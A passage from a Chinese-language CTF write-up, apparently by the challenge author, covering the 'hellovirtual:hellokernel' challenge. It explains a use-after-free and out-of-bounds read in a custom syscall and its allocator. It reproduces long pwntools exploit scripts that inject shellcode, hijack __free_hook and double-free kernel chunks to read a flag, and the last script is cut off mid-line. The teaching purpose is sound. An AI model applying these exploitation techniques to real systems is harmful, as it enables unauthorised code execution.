p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your new slogan:\n'</span>)</span><br><span class="line">    p.send(slogan)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your new name:\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'my you name:)\n'</span>)</span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    sub rsp,0x10000;</span></span><br><span class="line"><span class="string">	mov rsi,rsp;</span></span><br><span class="line"><span class="string">	xor rdi,rdi;</span></span><br><span class="line"><span class="string">	push 0x10000;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	push 0;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	jmp rsi;</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x10</span>,<span class="string">'\x00'</span>)</span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'codebase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'code: '</span>)</span><br><span class="line">codebase = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0xCBA</span></span><br><span class="line">log.success(<span class="string">'codebase = '</span>+hex(codebase))</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">29</span>)</span><br><span class="line">edit_slogan(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">0x10</span>+p64(codebase+<span class="number">0x2030B8</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'libcbase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'libc: '</span>)</span><br><span class="line">libcbase = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)-(<span class="number">0x7ff22b9b7760</span><span class="number">-0x7ff22b5cb000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'stackbase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack: '</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x80</span></span><br><span class="line">log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line">edit_slogan(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">0x10</span>+p64(libcbase+libc.sym[<span class="string">'__free_hook'</span>])+p64(<span class="number">0x100</span>))</span><br><span class="line">edit_slogan(<span class="number">9</span>,p64(stack))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.open(<span class="string">'flag'</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">shellcode+= asm(<span class="string">'mov rbp,rax;'</span>)</span><br><span class="line">shellcode+= asm(shellcraft.mprotect(<span class="string">'rbp'</span>,<span class="number">0x1000</span>,<span class="number">7</span>))</span><br><span class="line">shellcode+= asm(shellcraft.write(<span class="number">1</span>,<span class="string">'rbp'</span>,<span class="number">0x100</span>))</span><br><span class="line">shellcode+= asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hellovirtual-hellokernel"><a href="#hellovirtual-hellokernel" class="headerlink" title="hellovirtual:hellokernel"></a>hellovirtual:hellokernel</h2><p>这道题是全场唯一一道零解题，虽然有点小遗憾但也是提前预料到的。<br>PS: 首先解这道题需要获得用户空间的任意代码执行能力，要是用<code>rop</code>会非常麻烦。</p>
<p><strong><code>hellokernel</code>的漏洞点为在我自定义的系统调用中存在<code>UAF</code>和越界读</strong>，其实漏洞点已经相对比较好发现了，因为<code>hellokernel</code>本质上就做了两个工作，一个是向下与<code>hellovirtual</code>层的对接，二是向上与<code>hellouser</code>层的对接，向下是不太可能了，因为这题没有第三层，所以肯定是在于用户层对接时的问题，然后就可以通过给的<code>hellokernel.i64</code>去分析系统调用表。</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6pNlTO.png" alt=""></p>
<p>发现对<code>syscall_table</code>有个<code>0x2333</code>的下限检测，所以可以推测出<code>syscall_table[0x2333]</code>应该就是自定义的系统调用了。</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6pNUXt.png" alt=""></p>
<p>这里我已将其重命名为<code>sys_xmzyshypnctql</code>，其定义了一个<code>chunklist</code>和<code>sizelist</code>，用户态可以分配内核态<code>chunk</code>并传入数据和从其中读出数据：</p>
<p><img src="https://s3.ax1x.com/2021/02/27/6pN078.png" alt=""></p>
<p>然后发现其在<code>hp_write</code>时，<code>offset</code>没有进行上限检测，可以越界读：</p>
<p><img src="https://md.byr.moe/uploads/upload_a717dd9bca8e462303b06dd5e311c57a.png" alt="img"></p>
<p>在<code>kfree</code>时存在<code>UAF</code>：</p>
<p><img src="https://md.byr.moe/uploads/upload_48ae4cffcaf79df32ca43ca6d36012e6.png" alt="img"></p>
<p>到这里为止都比较简单，我的漏洞留的已经相对比较明显，比在固有系统调用中留洞好发现的多了(比如在mmap/mprotect之类原有的系统调用中留漏洞估计根本找不到吧)</p>
<p>难的是后面的利用步骤：(😂逃</p>
<p>难点主要有三：</p>
<ol>
<li>想利用<code>UAF</code>的话，必须熟悉<code>kmalloc</code>和<code>kfree</code>中内存分配方式，其为自定义的新的内存分配方式。</li>
<li>我们想要做到内核空间的任意地址写，这个地址是怎样的形式?(其被加载到kvm的物理内存中，有自己的虚拟地址，这个虚拟地址的规则是如何制定的，以及内核空间和用户空间的地址是如何隔离的，在哪里隔离的)。</li>
<li>如何调试?</li>
</ol>
<p>关于第一点，需要一定的时间去逆向这个内存分配方式，要是对<code>malloc</code>和<code>free</code>的源码比较熟悉的话这个可能不是大问题，我这里简单说一下其分配方式：首先<code>size</code>必须是<code>0x10</code>对齐的，然后是以<code>0x80</code>为单位进行分配的，也就是分配出的<code>chunk</code>肯定是<code>0x80</code>的倍数且最小为<code>0x80</code>。<code>chunk</code>的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|   size   |   nop   |</span><br><span class="line">| next_ptr |         |</span><br><span class="line">|          |         |</span><br><span class="line">|          |         |</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>next_ptr</code>位在<code>chunk</code>被<code>free</code>时放入<code>ublink</code>时指向下一个<code>chunk</code>，被使用时正常存放用户数据，<code>ublink</code>中的<code>chunk</code>根据<code>size</code>从大到小排列，<strong>从<code>ublink</code>中取<code>chunk</code>时会对<code>size</code>进行检查，必须要<code>0x10</code>对齐且为<code>0x80</code>的倍数</strong>。</p>
<p>关于第二点，不理解第二点的话可能会被越界读吸引了注意力，实际上这道题只用<code>UAF</code>就足够了，那个越界读是我开始时想的一个比较麻烦且错误的利用手法使用的，那个方法是通过越界读逃逸出<code>kernel</code>的物理内存(<code>hellovirtual</code>虚拟内存中一块<code>0x200000</code>的空间)，读到<code>hellovirtual</code>的<code>libc</code>中的变量(因为<code>libc</code>是紧贴着<code>hellokernel</code>的那块虚拟内存的)进而获取到<code>hellovirtual</code>的<code>libc</code>的基址，然后再减去固定的偏移获得<code>hellokernel</code>在<code>hellovirtual</code>中虚拟地址的基址，再去<code>UAF</code>。<br>但是实际上是完全没有必要的，因为<code>hellokernel</code>中使用的地址是其自己的虚拟地址，而且其也没开<code>PIE</code>这一说，所以只要分析出其基址即可，其基址通过<code>IDA</code>分析或者调试都可以分析出为<code>0x8000000000</code>。</p>
<p><code>IDA</code>中如下，将虚拟地址与<code>0x8000000000</code>异或获取其物理地址：</p>
<p><img src="https://md.byr.moe/uploads/upload_3f4c4f96147afd44bfe9ab7e4a75c09e.png" alt="img"></p>
<p>有了虚拟地址的基址我们就可以通过加上相对地址获取到变量的虚拟地址，从而获取到<code>chunklist</code>和<code>sizelist</code>在<code>hellokernel</code>中的虚拟地址。</p>
<p>所以利用思路已经明确：</p>
<ol>
<li>用<code>malloc</code>原语小幅度堆喷整理碎片</li>
<li><code>double free</code></li>
<li>再<code>kmalloc</code>出来改写自己的<code>next_ptr</code>到<code>fake_size</code>(用<code>sizelist</code>中的<code>size</code>作为<code>fake_size</code>绕过<code>kmalloc</code>中的<code>size</code>检测)</li>
<li>再次<code>kmalloc</code>分配到<code>sizelist</code>(<code>sizelist</code>和<code>chunklist</code>挨在一起，进而可以控制<code>chunklist</code>)，造成任意地址写任意值的攻击效果。</li>
<li>改写<code>sys_open</code>的规则，绕过白名单限制，打开<code>flag_xmzyshypnctql</code>读出其内容即可。</li>
</ol>
<p>关于调试：我个人调试的方法是向<code>chunk</code>中写入特殊的字符，然后使<code>shellcode</code>陷入死循环卡住。<br>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = .......  <span class="comment">#有效的shellcode</span></span><br><span class="line">shellcode+= asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xxrwtcl: </span></span><br><span class="line"><span class="string">    jmp xxrwtcl;</span></span><br><span class="line"><span class="string">'''</span>)</span><br></pre></td></tr></table></figure>
<p>然后用<code>gdb</code>去<code>attach</code>上<code>hellovirtual</code>程序，<code>find</code>我们填入的特殊字符，进而查看<code>hellokernel</code>中的对应变量和位置的内存情况是否如我们所愿，后期理解了基址之后，也可以直接使<code>shellcode</code>卡死然后查看<code>chunklist</code>和<code>sizelist</code>即可。</p>
<p>附上几张调试图：</p>
<p><img src="https://md.byr.moe/uploads/upload_c7df0057fb06181abe3c2f69d5432f21.png" alt="img"></p>
<p><img src="https://md.byr.moe/uploads/upload_b308ec2e3ad708665601c72cf33f1660.png" alt="img"></p>
<p><img src="https://md.byr.moe/uploads/upload_bb8e3fd264df16de341441675961e636.png" alt="img"></p>
<p>最后成功获取到第二个<code>flag</code>：</p>
<p><img src="https://md.byr.moe/uploads/upload_920551443302e85ffd847c5dfffcb72f.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys,os,string</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf_path = './hellouser'</span></span><br><span class="line">elf_path = <span class="string">'./hellovirtual ./hellokernel ./ld.so.2 ./hellouser'</span>.split(<span class="string">' '</span>)</span><br><span class="line">remote_libc_path = <span class="string">'./libc.so.6'</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">'10.104.255.213'</span></span><br><span class="line">port = <span class="number">8888</span></span><br><span class="line"><span class="comment">#P = ELF(elf_path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['terminator','-x','sh','-c']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">	p = process(elf_path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line">	libc = ELF(remote_libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name,size,slogan)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team name:\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team slogan size:\n'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team slogan:\n'</span>)</span><br><span class="line">    p.send(slogan)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_slogan</span><span class="params">(idx,slogan)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your new slogan:\n'</span>)</span><br><span class="line">    p.send(slogan)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'[+]your choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your team id:\n'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'[+]your new name:\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_kernel</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        push 1;</span></span><br><span class="line"><span class="string">        pop rdi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rsi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rdx;</span></span><br><span class="line"><span class="string">        push 0x2333;</span></span><br><span class="line"><span class="string">        pop rax;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">        '''</span> % (idx,size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_kernel</span><span class="params">(idx,size,buf)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        push 3;</span></span><br><span class="line"><span class="string">        pop rdi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rsi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rdx;</span></span><br><span class="line"><span class="string">        movabs r8,%ld;</span></span><br><span class="line"><span class="string">        push 0x2333;</span></span><br><span class="line"><span class="string">        pop rax;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">        '''</span> % (idx,size,buf))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_kernel</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        push 4;</span></span><br><span class="line"><span class="string">        pop rdi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rsi;</span></span><br><span class="line"><span class="string">        push 0x2333;</span></span><br><span class="line"><span class="string">        pop rax;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">        '''</span> % (idx))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_kernel</span><span class="params">(idx,offset,buf)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        push 2;</span></span><br><span class="line"><span class="string">        pop rdi;</span></span><br><span class="line"><span class="string">        push %d;</span></span><br><span class="line"><span class="string">        pop rsi;</span></span><br><span class="line"><span class="string">        movabs rcx,%ld;</span></span><br><span class="line"><span class="string">        movabs r8,%ld;</span></span><br><span class="line"><span class="string">        push 0x2333;</span></span><br><span class="line"><span class="string">        pop rax;</span></span><br><span class="line"><span class="string">        syscall;</span></span><br><span class="line"><span class="string">        '''</span> % (idx,offset,buf))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'my you name:)\n'</span>)</span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    sub rsp,0x10000;</span></span><br><span class="line"><span class="string">	mov rsi,rsp;</span></span><br><span class="line"><span class="string">	xor rdi,rdi;</span></span><br><span class="line"><span class="string">	push 0x10000;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	push 0;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	jmp rsi;</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x10</span>,<span class="string">'\x00'</span>)</span><br><span class="line">new(<span class="string">'\x00'</span>*<span class="number">29</span>,<span class="number">0x100</span>,<span class="string">'\x00'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'codebase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'code: '</span>)</span><br><span class="line">codebase = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0xCBA</span></span><br><span class="line">log.success(<span class="string">'codebase = '</span>+hex(codebase))</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">29</span>)</span><br><span class="line">edit_slogan(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">0x10</span>+p64(codebase+<span class="number">0x2030B8</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'libcbase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'libc: '</span>)</span><br><span class="line">libcbase = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)-(<span class="number">0x7ff22b9b7760</span><span class="number">-0x7ff22b5cb000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x1337</span>))</span><br><span class="line">p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'stackbase'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack: '</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x80</span></span><br><span class="line">log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">edit_slogan(<span class="number">9</span>,p32(<span class="number">0x100</span>)+p32(<span class="number">1</span>))</span><br><span class="line">edit_slogan(<span class="number">10</span>,<span class="string">'\x11'</span>*<span class="number">0x10</span>+p64(libcbase+libc.sym[<span class="string">'__free_hook'</span>])+p64(<span class="number">0x100</span>))</span><br><span class="line">edit_slogan(<span class="number">9</span>,p64(stack))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">shellcode = new_kernel(<span class="number">0</span>,<span class="number">0xf0</span>)*<span class="number">0x30</span></span><br><span class="line">shellcode+= new_kernel(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+= new_kernel(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">shellcode+= new_kernel(<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line">shellcode+= new_kernel(<span class="number">3</span>,<span class="number">0xf0</span>)</span><br><span class="line">shellcode+= delete_kernel(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">shellcode+= asm(shellcraft.read(<span class="number">0</span>,stack,<span class="number">0xf0</span>))</span><br><span class="line">shellcode+= edit_kernel(<span class="number">1</span>,<span class="number">3</span>,stack)</span><br><span class="line">shellcode+= new_kernel(<span class="number">4</span>,<span class="number">0xf0</span>)</span><br><span class="line">shellcode+= new_kernel(<span class="number">5</span>,<span class="number">0xf0</span>)</span><br><span class="line">shellcode+= edit_kernel(<span class="number">5</span>,<span class="number">0xb</span>,stack+<span class="number">8</span>)</span><br><span class="line">shellcode+= edit_kernel(<span class="number">2</span>,<span 